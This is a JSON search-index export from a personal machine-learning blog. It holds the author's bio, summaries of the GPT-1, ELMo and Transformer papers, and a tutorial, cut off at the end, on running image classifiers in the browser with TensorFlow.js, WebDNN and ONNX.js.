[{"authors":["admin"],"categories":null,"content":"I am working as an AI Engineer at Mastercard. My team is based in Gurugram, India and is a relatively new team working on leveraging AI to get certain insights and automating stuff to make the transactions world a smarter and secure place.\nI did my B.Tech in Computer Science and Engineering from IIT (BHU) Varanasi. My B.Tech advisor was Prof. K.K. Shukla. I worked on privacy-preserving Machine Learning and its application in the medical industry. Previously I had also worked with him on Adversarial Machine Learning and Malware classification problems. In summer 2019, I was an intern at Samsung Research Institute - Bangalore, working on mobility in 5G networks. I also worked as a research intern at the C3i Institute, Indian Institute of Technology Kanpur on Malware Detection for Linux, in winter 2018. In summer 2018, I was a Data Science intern at Innoplexus, Pune (India), working with the Computer Vision team. I have also worked with Dr. Anil Kumar Singh, on sentiment analysis on product reviews and natural language generation.\nWhen not working on research, I enjoy playing CTFs (wr47h), either solo or with my team Abs0lut3Pwn4g3. I also enjoy competitive programming and reading novels.\n","date":-62135596800,"expirydate":-62135596800,"kind":"taxonomy","lang":"en","lastmod":-62135596800,"objectID":"2525497d367e79493fd32b198b28f040","permalink":"https://shreyansh26.github.io/authors/admin/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/authors/admin/","section":"authors","summary":"I am working as an AI Engineer at Mastercard. My team is based in Gurugram, India and is a relatively new team working on leveraging AI to get certain insights and automating stuff to make the transactions world a smarter and secure place.\nI did my B.Tech in Computer Science and Engineering from IIT (BHU) Varanasi. My B.Tech advisor was Prof. K.K. Shukla. I worked on privacy-preserving Machine Learning and its application in the medical industry.","tags":null,"title":"Shreyansh Singh","type":"authors"},{"authors":["Shreyansh Singh"],"categories":["Machine Learning"],"content":"Paper: Improving Language Understanding by Generative Pre-Training\nLink: https://bit.ly/3xITvGP\nBlog: https://openai.com/blog/language-unsupervised/ Authors: Alec Radford, Karthik Narasimhan, Tim Salimans, Ilya Sutskever\nCode: https://bit.ly/3gUFrUX\n What? The paper proposes a semi-supervised technique that shows better performance on a wide variety of tasks like textual entailment, question answering, semantic similarity text classification by using a single task-agnostic model. The model can overcome the constraints of the small amount of annotated data for these specific tasks by performing an unsupervised generative-pretraining of a language model on a large diverse text corpus followed by supervised discriminative fine-tuning on each specific task. The pretraining model remains the same for all the tasks. Only a small, task-aware input adaptation is required when performing the fine-tuning. The model significantly improved the state-of-the-art (at the time) in 9 of the 12 tasks studied.\nWhy? Most deep learning models require a substantial amount of data, which makes them difficult to train for tasks in which there is a dearth of good quality annotated data. Historically, pre-trained word embeddings have been used for such cases but the word-level information in itself is sometimes not enough for many of the complex tasks.\nHow? The goal of the model is to learn a universal representation that transfers with little adaptation to a wide range of tasks. The paper assumes access to a large corpus of unlabeled text and several datasets with manually annotated training examples (the target tasks). The unlabeled corpus and the annotated datasets need not be in the same domain.\nA two-stage training procedure is used. First, a language modelling (LM) objective is used on the unlabeled data to learn the initial parameters of the model. Next, these parameters are adapted to a target task using the corresponding supervised objective.\nA Transformer (specifically a Transfomer decoder) is used as the underlying architecture. Transformers work better than LSTMs (shown in the results as well) because they can capture long-term dependencies well which results in robust transfer performance across diverse tasks. Furthermore, during the transfer, as mentioned above, task-specific input adaptations are used which process the structured text input as a single contiguous sequence of tokens. This is something very interesting and will be shown in the subsequent sections.\nUnsupervised pre-training A standard forward LM objective is used to maximise the likelihood -\n\r\r\rHere, , U is the corpus of tokens {u1,\u0026hellip; un}, k is the context window size and the conditional probability P is modeled using a network with parameters Θ. SGD is used to learn the parameters. The model uses a multi-layer Transformer decoder. The multi-head self-attention is applied over the input context tokens. This is followed by position-wise feedforward layers to produce an output probability distribution over the target tokens.\n\r\r\rHere U is (u-k,\u0026hellip;, u-1) which is the context vector of tokens, n is the number of layers, We is the token embedding matrix and Wp is the position embedding matrix.\nSupervised fine-tuning After the training of the model with optimization L1, the parameters are now adapted to the supervised target task. The labelled dataset is denoted by C, where each instance is a sequence of input tokens, x1,\u0026hellip;,xm, along with a label y. The inputs are passed through the pre-trained model to obtain the final transformer block\u0026rsquo;s activation hlm, which is then fed into an added linear output layer with parameters Wy to predict y.\n\r\r\rThe objective to be maximized is as follows\n\r\r\rUsing an LM objective as an auxiliary objective to the finetuning helped to improve the generalization of the supervised model and make it converge faster.\nThe overall objective can be written as -\n\r\r\rTask-specific input transformations \r\r\rSince the pretrained model is trained on a contiguous sequence of texts, to handle the inputs of the various tasks, certain input transformations are needed as shown above. These transformations help to avoid making extensive changes to the architecture across tasks.\n Textual Entailment - The premise (p) and the hypothesis (h) sequences are concatenated with a delimiter token in between. Similarity - Since there is no inherent ordering of the two sequences being compared, the input sequence is modified to contain both possible sentence orderings (with a delimiter in between). Each of these concatenated sequences is processed independently to produce two sequence representations hlm which are then element-wise added before feeding to the linear output layer. Question Answering - This one is interesting. For a given context document z, question q and a set of possible answers {ak}. The document and question are concatenated with each of the possible answers, with a delimiter token in between [z; q;$;ak]. Each of these sequences is processed independently by the model and then normalized by a softmax layer to produce an output distribution over possible answers.  The model specifications for the experimental setup are shown below -\n\r\r\rExperimental Setup\r\r\rResults The datasets that were used are listed below -\n\r\r\r Natural Language Inference - This task is challenging due to the presence of a wide variety of phenomena like lexical entailment, coreference, and lexical and syntactic ambiguity. The model performs better than the state-of-the-art in 4 (MNLI, QNLI, SNLI, SciTail) out of 5 datasets.  \r\r\r Question Answering and Commonsense Reasoning - The RACE dataset (passages with associated questions from middle and high school exams) and Story Cloze dataset (selecting correct ending to multi-sentence stories from two options) were used. The model outperformed the baseline on both these datasets.  \r\r\r  Semantic Similarity - The challenges in this task are recognizing rephrasing, negation, and handling ambiguity. The model performs better on 2 (QQP and STS-B) of the 3 datasets.\n  Classification - The model performs better on both Corpus of Linguistic Accepttability (CoLA) dataset and is at par with the state-of-the-art results on the Stanford Sentiment Treebank dataset.\n  \r\r\rKey points from the analysis section -\n More the number of layers that are transferred from the pretrained model to the supervised target task, the better is the performance on the target tasks. To understand whether the unsupervised pre-training is effective or not, zero-shot testing was also performed i.e., using the pre-trained model directly without any finetuning. The model performance is stable and steadily increases over training suggesting that the generative pre-training supports the learning of a wide variety of task-relevant functionality. LSTMs exhibit higher variance in their zero-shot performance. The testing and input transformations for using the pretrained model directly are explained below - \r\r\r  \r\r\r From the ablation studies, the authors show that the auxiliary LM objective helps on the NLI tasks and QQP (Quora Question Pairs data). Overall, larger datasets benefit from the auxiliary objective more than the smaller datasets. In general, the Transformer architecture performs better than a 2048 unit single layer LSTM model (if the Transformer in the pretraining model is replaced by an LSTM) on all datasets except the MRPC (Microsoft Paraphrase Corpus for semantic similarity) dataset. On comparing this model with the same transformer architecture trained in a supervised manner, it is observed that the model with pre-training performs better. This consistent for all the tasks mentioned in the paper, suggesting that pre-training helps to capture important linguistic information which is not captured when training with a supervised approach alone.   I have also released an annotated version of the paper. If you are interested, you can find it here.\nThis is all for now!\n \rSubscribe to my posts! --\rSubscribe to my posts!\r\r.example_a {\rcolor: #fff !important;\rtext-transform: uppercase;\rtext-decoration: none;\rbackground: #3f51b5;\rpadding: 20px;\rborder-radius: 5px;\rcursor: pointer;\rdisplay: inline-block;\rborder: none;\rtransition: all 0.4s ease 0s;\r}\r.example_a:hover {\rbackground: #434343;\rletter-spacing: 1px;\r-webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);\r-moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);\rbox-shadow: 5px 40px -10px rgba(0,0,0,0.57);\rtransition: all 0.4s ease 0s;\r}\r\rfunction showMailingPopUp() {\rwindow.dojoRequire([\"mojo/signup-forms/Loader\"], function(L) { L.start({\"baseUrl\":\"mc.us4.list-manage.com\",\"uuid\":\"0b10ac14f50d7f4e7d11cf26a\",\"lid\":\"667a1bb3da\",\"uniqueMethods\":true}) })\rdocument.cookie = \"MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC\";\r}\rdocument.getElementById(\"openpopup\").onclick = function() {showMailingPopUp()};\r\r Follow me on Twitter, Github or connect on LinkedIn.\n","date":1619943134,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1619943134,"objectID":"3e87952d62fad33903eb147bda3e9480","permalink":"https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/","publishdate":"2021-05-02T13:42:14+05:30","relpermalink":"/post/2021-05-02_language_understanding_generative_pretraining/","section":"post","summary":"Paper: Improving Language Understanding by Generative Pre-Training\nLink: https://bit.ly/3xITvGP\nBlog: https://openai.com/blog/language-unsupervised/ Authors: Alec Radford, Karthik Narasimhan, Tim Salimans, Ilya Sutskever\nCode: https://bit.ly/3gUFrUX\n What? The paper proposes a semi-supervised technique that shows better performance on a wide variety of tasks like textual entailment, question answering, semantic similarity text classification by using a single task-agnostic model. The model can overcome the constraints of the small amount of annotated data for these specific tasks by performing an unsupervised generative-pretraining of a language model on a large diverse text corpus followed by supervised discriminative fine-tuning on each specific task.","tags":["paper reading","word representations","nlp","language model","gpt","transformer","deep learning"],"title":"Paper Notes #3 - Improving Language Understanding by Generative Pre-Training","type":"post"},{"authors":["Shreyansh Singh"],"categories":["Machine Learning"],"content":"Paper: Deep contextualized word representations\nLink: https://arxiv.org/abs/1802.05365 Authors: Matthew E. Peters, Mark Neumann, Mohit Iyyer, Matt Gardner, Christopher Clark, Kenton Lee, Luke Zettlemoyer\nCode: https://bit.ly/3xpHNAI\n Note - Since this is a relatively old paper, all the performance comparisons and state-of-the-art claims mentioned below should only be considered for the models at the time the paper was published.\nWhat? The paper proposes a new type of deep contextualized word representation that helps to effectively capture the syntactic and semantic characteristics of the word along with the linguistic context of the word. It can help differentiate the same word being used in different contexts with different meanings. The representations (embeddings) are learned from the internal states of a deep bidirectional language model (biLM). The embeddings, when used with the existing models, significantly improved the state of the art in six NLP problems - Question Answering, Natural Language Inference, Semantic Role Labeling, Coreference Resolution, Named Entity Recognition and Sentiment Analysis.\nWhy? The existing word representations commonly in use were Word2Vec and GloVe. However, there was a need to capture even richer word representations. The paper states that the two main requirements of a good representation should be that they should be able to capture the complex characteristics of the word use and at the same time capture polysemy as well. This is the idea behind using ELMo (Embeddings from Language Models) representations.\nHow? As a high-level overview, it can be said that the ELMo representations are a function of the entire input sequence. A two-layer biLM model with character-level convolutions is trained on a text corpus. The ELMo word representations are computed as a linear function of the internal network states of the biLM. The biLM is pretrained on a large scale and the ELMo representations can be incorporated into several deep learning-based NLP architectures.\nbiLM (Bidirectional Language Model) A forward language model computes the probability of the sequence by modelling the probability of a token tk given the history (t1, \u0026hellip;, tk-1). Similarly, a backward language model predicts the previous token given the nature context i.e., it performs the same function but in reverse order.\n\r\r\rForward LM probability modelling\r\r\r\r\r\rBackward LM probability modelling\r\r\rIn a forward LM, a context-independent token representation xkLM is obtained from a character-level CNN and then passed through L layers of LSTMs. At each position k, the LSTM layer outputs a context-dependent representation hk,jLM, where j = 1, \u0026hellip;, L. the top layer of the LSTM output is used to predict the next token tk+1 with a Softmax layer. The same procedure is applied to the backward LM as well.\n\r\r\rbiLM probability modelling\r\r\rA biLM combines both the forward and backward LM. The above formulation jointly optimizes the log-likelihood of the forward and backward directions.\nThe formulation ties both the token representation Θx and the Softmax layer Θs Separate paremeters are maintained for the forward and backward LSTMs.\nNext, we look at getting the word representations using ELMo.\nELMo ELMo is a task-specific combination of the intermediate layer representations of the biLM model. If we have L LSTM layers, then for each token tk we have 2L + 1 representations.\n\r\r\rNow to get one single vector for each token, all the representations in R are merged to one. Usually, task-specific weighting is performed.\n\r\r\rThe stask are softmax normalized weights and the scale parameter γtask allows te task model to scale the entire ELMo vector. In spme cases, applying LayerNorm to each biLM layer before weighting also helped.\nUsing ELMo for supervised NLP tasks We start with a pretrained biLM model, The biLM is run to record the layer representations for each word. When using any supervised deep learning MLP model have a common architecture for the lowest layers. They usually use a context-independent token representation xk for each token position using pre-trained embeddings and optionally also using character-based representations. Then, in the higher layers, the model forms context-sensitive representations using RNNs, CNNs or whatever, as per the task and the model. For using ELMo, we can start in the same manner. We obtain the embeddings from the freezed weights of the biLM. Now instead of passing just xk to the above layers, we will pass  [xk; ELMoktask ] into the task model layers. For some tasks like SNLI (Natural language Inference) and SQuAD (Question-Answering), it was also seen that including ELMo at the output of the task model by introducing another set of output specific linear weights and replacing hk with [hk; ELMoktask ] led to an improvement.\nAdditionally, in some cases, regularizing the ELMo weights with λ||w||22 helped introduce an inductive bias on the ELMo weights to make it stay close to the average of all biLM layers.\nPre-trained bidirectional language model architecture The pre-trained biLM used in the paper is similar to the architecture in Józefowicz et al.. It is modified to support joint training of both directions and a residual connection is added between the LSTM layers. The size of the embeddings and layers were from what was in the CNN-BIG-LSTM architecture in Józefowicz et al.. The final model has L=2 biLSTM layers with 4096 units and 512-dimensional embeddings and a residual connection from the first to the second layer. The context insensitive type representation uses 2048 character n-gram convolutional filters followed by two highway layers and a linear projection down to a 512 representation. As a result, the biLM provides three layers of representations for each input token, including those outside the training set due to the purely character input.\nResults \r\r\rResults comparison of the baseline models with the ones used along with ELMo\r\r\rThe details of the baseline models are given in the paper. In all the tasks, the use of the ELMo representations led to improvement in the state-of-the-art results.\nKey points from the analysis section -\n Regularization parameter λ is important. λ=1 means that we are effectively reducing the weighting function to a simple average over the layers, while smaller values like λ=0.001 allows the layer weights to vary. The fact that we take the representations from all the layers gives a better performance as compared to just taking the topmost layer. Taking just the last layer is still better than the baseline. A small λ is preferred in most cases with ELMo, although for NER, a task with a smaller training set, the results are insensitive to λ.  \r\r\rBaseline vs ELMo last layer vs All the layers\r\r\r Including ELMo at both the input and output layers for SNLI and SQuAD improves over just the input layer. This is because SNLI and SQuAD use an attention layer after the biRNN and using ELMo at the output layer would allow the model to attend directly to the internal representations of the biLM. But for SRL (and coreference resolution) performance is highest when it is included at just the input layer. Probably because the task-specific context representations are more important than those from the biLM.  \r\r\r The higher-level LSTM states of the biLM capture context-dependent aspects of word meaning (e.g., they can be used without modification to perform well on supervised word sense disambiguation tasks) while lower-level states model aspects of syntax (e.g., they can be used to do part-of-speech tagging).  \r\r\rbiLM captures the context of the word \u0026lsquo;play\u0026rsquo; effectively from the source sentences\r\r\r  Different layers in the biLM represent different types of information and explains why including all biLM layers are important for the highest performance in downstream tasks.\n  Using ELMo with a model also improves the sample efficiency. The model now requires a fewer number of epochs (parameter updates) and less amount of training data as well. For eg., the baseline SRL model requires 486 epochs to reach the maximum F1 score. The model with the ELMo representations only requires 10 epochs to exceed the baseline. In addition, ELMo-enhanced models use smaller training sets more efficiently than models without ELMo. Again, if we consider the SRL case, the ELMo model with 1% of the training set has about the same F1 as the baseline model with 10% of the training set.\n  \r\r\rbiLM captures the context of the word \u0026lsquo;play\u0026rsquo; effectively from the source sentences\r\r\r I have also released an annotated version of the paper. If you are interested, you can find it here.\nThis is all for now!\n \rSubscribe to my posts! --\rSubscribe to my posts!\r\r.example_a {\rcolor: #fff !important;\rtext-transform: uppercase;\rtext-decoration: none;\rbackground: #3f51b5;\rpadding: 20px;\rborder-radius: 5px;\rcursor: pointer;\rdisplay: inline-block;\rborder: none;\rtransition: all 0.4s ease 0s;\r}\r.example_a:hover {\rbackground: #434343;\rletter-spacing: 1px;\r-webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);\r-moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);\rbox-shadow: 5px 40px -10px rgba(0,0,0,0.57);\rtransition: all 0.4s ease 0s;\r}\r\rfunction showMailingPopUp() {\rwindow.dojoRequire([\"mojo/signup-forms/Loader\"], function(L) { L.start({\"baseUrl\":\"mc.us4.list-manage.com\",\"uuid\":\"0b10ac14f50d7f4e7d11cf26a\",\"lid\":\"667a1bb3da\",\"uniqueMethods\":true}) })\rdocument.cookie = \"MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC\";\r}\rdocument.getElementById(\"openpopup\").onclick = function() {showMailingPopUp()};\r\r Follow me on Twitter, Github or connect on LinkedIn.\n","date":1619343793,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1619343793,"objectID":"5e6243cf8c33fd67fe8f12431089967c","permalink":"https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/","publishdate":"2021-04-25T15:13:13+05:30","relpermalink":"/post/2021-04-25_deep_contextualized_word_representations_elmo/","section":"post","summary":"Paper: Deep contextualized word representations\nLink: https://arxiv.org/abs/1802.05365 Authors: Matthew E. Peters, Mark Neumann, Mohit Iyyer, Matt Gardner, Christopher Clark, Kenton Lee, Luke Zettlemoyer\nCode: https://bit.ly/3xpHNAI\n Note - Since this is a relatively old paper, all the performance comparisons and state-of-the-art claims mentioned below should only be considered for the models at the time the paper was published.\nWhat? The paper proposes a new type of deep contextualized word representation that helps to effectively capture the syntactic and semantic characteristics of the word along with the linguistic context of the word.","tags":["paper reading","word representations","nlp","language model","lstm","deep learning"],"title":"Paper Notes #2 - Deep contextualized word representations","type":"post"},{"authors":["Shreyansh Singh"],"categories":["Machine Learning"],"content":"Paper: Attention Is All You Need\nLink: https://bit.ly/3aklLFY\nAuthors: Ashish Vaswani, Noam Shazeer, Niki Parmar, Jakob Uszkoreit, Llion Jones, Aidan N. Gomez, Lukasz Kaiser, Illia Polosukhin\nCode: https://github.com/tensorflow/tensor2tensor\n What? Proposes Transformers, a new simple architecture for sequence transduction that uses only an attention mechanism and does not use any kind of recurrence or convolution. This model achieves SOTA (at the time) on the WMT 2014 English-to-French translation task with a score of 41.0 BLEU. Also beats the existing best results on the WMT 2014 English-to-German translation task with a score of 28.4 BLEU. The training cost is also much less than the best models chosen in the paper (at the time).\nWhy? Existing recurrent models like RNNs, LSTMs or GRUs work sequentially. They align the positions to steps in computation time. They generate a sequence of hidden states as a function of the previous hidden state and the input for the current position. But sequential computation has constraints. They are not easily parallelizable which is required when the sequence lengths become large. The Transformer model eschews recurrence and allows for more parallelization and requires less training time to achieve SOTA in the machine translation task.\nHow? \r\r\rDetailed Transformer Architecture\r\r\rThe model is auto-regressive, it consumes the previously generated symbols as additional input when generating the next.\nEncoder The figure above shows just one layer of the encoder on the left. There are N=6 such layers. Each layer has two sub-layers - a multi-head self-attention layer and a position-wise fully connected feed-forward network. Residual connections and layer normalization is used for each sub-layer.\nDecoder This also has N=6 stacked layers. The architecture diagram shows one layer of the decoder on the right. Each layer has three sub-layers. Two of them are the same as the encoder. The third layer performs multi-head attention over the output of the encoder stack. This is modified to prevent positions from attending to subsequent positions. Additionally, the output embeddings are also offset by one position. These features ensure that the predictions for a position depend only on the known outputs for positions before it.\nAttention The paper uses a modified dot product attention, and it is called \u0026ldquo;Scaled Dot Product Attention\u0026rdquo;. Given queries and keys of dimension dk and values of dimension dv, the attention matrix is calculated as shown below.\n\r\r\rAttention Matrix Calculation\r\r\rSince, for large values of dk the dot product grows large in magnitude, it pushes the softmax function into regions where it has extremely small gradients. The scaling of 1/sqrt(dk) is done to avoid the problem of vanishing gradients.\nMulti-Head attention allows computing this attention in parallel. This helps to focus on different positions. Secondly, it also helps to attend to information from different subspaces due to the more number of attention heads.\n\r\r\rMultihead Attention Calculation\r\r\rThe paper uses h=8 parallel attention layers or heads. The reduced dimension of each head compensates for the more number of heads and hence the computational cost remains the same as with single-head attention with full dimensionality.\nApplications of multi-head attention in the paper are given below -\n\r\r\rApplication of multi-head attention in the model\r\r\r\r\r\rPictorial representaion of Multi-head attention\r\r\rPosition-wise Feed-Forward Networks The FFN sub-layer shown in the encoder and decoder architecture is a 2-hidden layer FC FNN with a ReLU activation in between.\nPositional Encodings Positional encodings are injected (added) to the input embeddings at the bottom of the encoder and decoder stack to add some information about the relative order of the tokens in the sequence. The positional encodings have the same dimension as the input embeddings so that they can be added. For position pos and dimension i the paper uses the following positional embeddings -\n\r\r\rPositional Encoding calculation\r\r\rThis choice allows the model to easily learn by the relative positions. The learned positional embeddings also perform about the same as the sinusoidal version. The sinusoidal version may allow the model to extrapolate to sequence lengths longer than the ones encountered in training.\nResults \r\r\rExperimental results when varying parameters\r\r\r Form (A), it can be seen that single-head attention is slightly worse than the best setting. The quality also drops off with too many heads. (B) shows that reducing the attention key size dk hurts model quality. In (C) and (D), it is visible that bigger models are better and dropout helps in avoiding overfitting. (E) shows that sinusoidal positional encoding when replaced with learned positional embeddings also does not lead to a loss in quality  For the base models, the authors used a single model obtained by averaging the last 5 checkpoints, which were written at 10-minute intervals. The big models were averaged over the last 20 checkpoints. Beam search with a beam size of 4 and length penalty α = 0.6. The maximum output length during inference is set to input length +50, but if it is possible, the model terminates early.\nThe performance comparison with the other models is shown below -\n\r\r\rModel performance\r\r\r I have also released an annotated version of the paper. If you are interested, you can find it here.\nThis is all for now!\n \rSubscribe to my posts! --\rSubscribe to my posts!\r\r.example_a {\rcolor: #fff !important;\rtext-transform: uppercase;\rtext-decoration: none;\rbackground: #3f51b5;\rpadding: 20px;\rborder-radius: 5px;\rcursor: pointer;\rdisplay: inline-block;\rborder: none;\rtransition: all 0.4s ease 0s;\r}\r.example_a:hover {\rbackground: #434343;\rletter-spacing: 1px;\r-webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);\r-moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);\rbox-shadow: 5px 40px -10px rgba(0,0,0,0.57);\rtransition: all 0.4s ease 0s;\r}\r\rfunction showMailingPopUp() {\rwindow.dojoRequire([\"mojo/signup-forms/Loader\"], function(L) { L.start({\"baseUrl\":\"mc.us4.list-manage.com\",\"uuid\":\"0b10ac14f50d7f4e7d11cf26a\",\"lid\":\"667a1bb3da\",\"uniqueMethods\":true}) })\rdocument.cookie = \"MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC\";\r}\rdocument.getElementById(\"openpopup\").onclick = function() {showMailingPopUp()};\r\r Follow me on Twitter, Github or connect on LinkedIn.\n","date":1618745269,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1618745269,"objectID":"2943012eaa508f698c02f7ad932cab7e","permalink":"https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/","publishdate":"2021-04-18T16:57:49+05:30","relpermalink":"/post/2021-04-18_attention_is_all_you_need/","section":"post","summary":"Paper: Attention Is All You Need\nLink: https://bit.ly/3aklLFY\nAuthors: Ashish Vaswani, Noam Shazeer, Niki Parmar, Jakob Uszkoreit, Llion Jones, Aidan N. Gomez, Lukasz Kaiser, Illia Polosukhin\nCode: https://github.com/tensorflow/tensor2tensor\n What? Proposes Transformers, a new simple architecture for sequence transduction that uses only an attention mechanism and does not use any kind of recurrence or convolution. This model achieves SOTA (at the time) on the WMT 2014 English-to-French translation task with a score of 41.","tags":["paper reading","transformers","nlp","deep learning"],"title":"Paper Notes #1 - Attention Is All You Need","type":"post"},{"authors":["Shreyansh Singh"],"categories":["Machine Learning"],"content":"After my last post on deploying Machine Learning and Deep Learning models using FastAPI and Docker, I wanted to explore a bit more on deploying deep learning models. My last post discussed a server-side method for deploying the model. This post will discuss client side frameworks and techniques to deploy those models such that they work directly on the client side.\nIn this tutorial I will be giving an overview of three frameworks, Tensorflow.js, WebDNN and ONNX.js. I will be a deploying a simple pretrained image classification model (ResNet or Mobilenet) on the three frameworks and also tell you the comparsion between them. In this tutorial, I haven\u0026rsquo;t deployed custom models of my own but I will be explaining how you can do it and the difficulties you could encounter.\nThe goal of this blog post is to introduce the three frameworks and how you can use them for deploying your models as well. Personally, I had not heard of WebDNN and ONNX.js before diving into this project, so I believe it can help some others like me to get familiar with these frameworks.\nTensorflow.js I found Tensorflow.js to be the easiest to use. It already has a large collection of some pretrained models. With Tensorflow.js, we don\u0026rsquo;t have a pretrained Resnet model because it is not exactly a lightweight model that can be deployed on a device with low compute power. So, I used Mobilenet (which is trained on the Imagenet dataset). Mobilenet was available in the Tensorflow.js pretrained models repository so I decided to use that directly.\nNow, on to the fun part, actually using the model and making a webapp. For the webapp portion, I am using Express, a web framework for Node.js. I have tried to keep the code structure and the webapp visually similar for all the three frameworks.\nLoading the model is as simple as -\n Now after loading the model, we call the imgSet function which bascially loads the image from the path we specify and loads it onto a canvas. Details of this can be seen in the code which I will post at the end.\nAlthough the Mobilenet model in Tensoflow.js doesn\u0026rsquo;t require a fixed size of the image, but for uniformity in all other frameworks (WebDNN, ONNX.js), I decided to resize the images to 224x224 size. The main code for running the model is shown below -\n The final webapp looks something like this -\n\r\r\rImage loading and prediction\r\r\rThe model works well. It knows it is some kind of a water related animal, and given the Imagenet classes it has been trained on, it gies the closest result possible.\nThe first prediction takes time (196ms) because the model is loaded and run for the first time. After that, the predictions take very little time (~80ms) mainly because the model is cached and predictions can be served faster.\nThe average time taken by different backends (over 20 predictions) is also shown below -\n   Backend Time     cpu 2100ms   wasm 82ms   webgl 70ms    If one wants to convert their own models to a Tensorflow.js compatible version, it is very easy to convert the model as well as load it into your web application. One can refer to tfjs-converter and the documentation given here.\nThe code for this section is present on my Github.\nWebDNN WebDNN was developed by the Machine Intellignece Laboratory at the University of Tokyo. From its website,\n WebDNN optimizes the trained DNN model to compress the model data and accelerate the execution, and executes it with novel JavaScript API such as WebAssembly and WebGPU to achieve zero-overhead execution. WebDNN supports 4 execution backend implementations: WebMetal, WebGL, WebAssembly, and fallback pure javascript implementation. By using these backends, WebDNN works all major browsers.\n More details are available on the website, but the image below accurately depicts the steps involved in this procedure.\n\r\r\rWebDNN model conversion flow\r\r\rWebDNN can be used to deploy tarined DNN models trained using popular DL frameworks like Tensorflow, Keras, PyTorch, Chainer, Kaffe. One disadvantage I found of using WebDNN is that the current model conversion module (as of writing the post) does not allow conversion using Tensorflow 2 and also does not support the latest versions of Keras (let alone tensorflow.keras).\nI used a pretrained ResNet50 model (trained on Imagnet dataset) for this. I am sharing the following Colab notebook which contains the code to convert the ResNet50 Keras model.\nOn to the web app coding part! The first thing the webapp does is to load the model.\n Next, we write the code to run the model on the image input.\n The final webapp looks something like this -\n\r\r\rWebDNN predictions\r\r\rThe model does a very good job of identifying it is a bus. The top two predictions relate to it.\nAgain, the first run takes a long time (~242ms) but the subsequent runs take quite less (~63ms average). Now one must note that ResNet50 is a relatively heavier model as compared to Mobilenet, but WebDNN manages to load it much faster than or at par with Mobilenet as we saw in the case with Tensorflow.js. Also, in the COlab notebook, we can see that for the same image, the ResNet50 model around 645ms to run the model. We easily see a ~10x improvement on converting the model to WebDNN.\nThe average time taken by different backends (over 20 predictions) is also shown below -\n   Backend Time     cpu 10000ms   webgl 60ms    WebDNN is quite optimised to run on futuristic hardware. The time it takes on a normal fallback vanilla-JS model version running on the CPU is around 10 seconds. But on WebGL, it takes much much less. I didn\u0026rsquo;t have access to a WebMetal backend, which they claim is the fastest. I would like to know if anyone runs it on WebGPU (WebMetal) and the average time the model took to run on it.\nThe code for this section is present on my Github.\nONNX Open Neural Network Exchange (ONNX) is an open source format for AI models, both deep learning and traditional ML.\nFrom their website -\n ONNX defines a common set of operators - the building blocks of machine learning and deep learning models - and a common file format to enable AI developers to use models with a variety of frameworks, tools, runtimes, and compilers.\n ONNX.js is an open source Javascript library by Microsoft for running ONNX models on browsers and on Node.js. Like Tensorflow.js and WebDNN, it also has support for WebGL and CPU. From theit Github\n With ONNX.js, web developers can score pre-trained ONNX models directly on browsers with various benefits of reducing server-client communication and protecting user privacy, as well as offering install-free and cross-platform in-browser ML experience.\n With ONNX.js, I used a pretrained ResNet50 model.\nLoading the model is similar -\n The ONNX examples on their repository gives some nice code snippets to show basic image preprocessing. I have used it directly in my code.\n After that, the following code snippet loads the preprocessed image to an input tensor and then runs the model on it and then prints the predictions.\n A demo of the webapp using ONNX.js is shown below.\n\r\r\rONNX.js predictions\r\r\r\r\r\rONNX.js predictions\r\r\rThe Resnet model does an awesome job with the airline image and classifies it correctly. It also performs decently on the bus image giving the top prediction as minibus. However, the goal of this post is not to judge how well the model works, but the technique of deploying the models and receiving predictions from them.\nI used the WebGL model for testing. It takes an average of 70ms to serve the predictions. The CPU version takes a VERY long time ~15000ms (15 seconds).\nThe average time taken by different backends (over 20 predictions) is also shown below. I had some trouble with the WASM version so I didn\u0026rsquo;t include them in the results.\n   Backend Time     cpu 15000ms   webgl 71ms    The best part about ONNX is that it is an open standard and allows easy conversion of models made in different frameworks to a .onnx model. I would suggest going through this tutorial for this.\nThe code for this section is present on my Github.\nThe End That is all for now. I hope that this tutorial will help the reader get an idea of these frameworks for client-side model deployment and one can also use my code as a boilerplate for setting up webapps of your own for deploying ML models using these frameworks.\n  \rSubscribe to my posts! --\rSubscribe to my posts!\r\r.example_a {\rcolor: #fff !important;\rtext-transform: uppercase;\rtext-decoration: none;\rbackground: #3f51b5;\rpadding: 20px;\rborder-radius: 5px;\rcursor: pointer;\rdisplay: inline-block;\rborder: none;\rtransition: all 0.4s ease 0s;\r}\r.example_a:hover {\rbackground: #434343;\rletter-spacing: 1px;\r-webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);\r-moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);\rbox-shadow: 5px 40px -10px rgba(0,0,0,0.57);\rtransition: all 0.4s ease 0s;\r}\r\rfunction showMailingPopUp() {\rwindow.dojoRequire([\"mojo/signup-forms/Loader\"], function(L) { L.start({\"baseUrl\":\"mc.us4.list-manage.com\",\"uuid\":\"0b10ac14f50d7f4e7d11cf26a\",\"lid\":\"667a1bb3da\",\"uniqueMethods\":true}) })\rdocument.cookie = \"MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC\";\r}\rdocument.getElementById(\"openpopup\").onclick = function() {showMailingPopUp()};\r\r Follow me on Twitter, Github or connect on 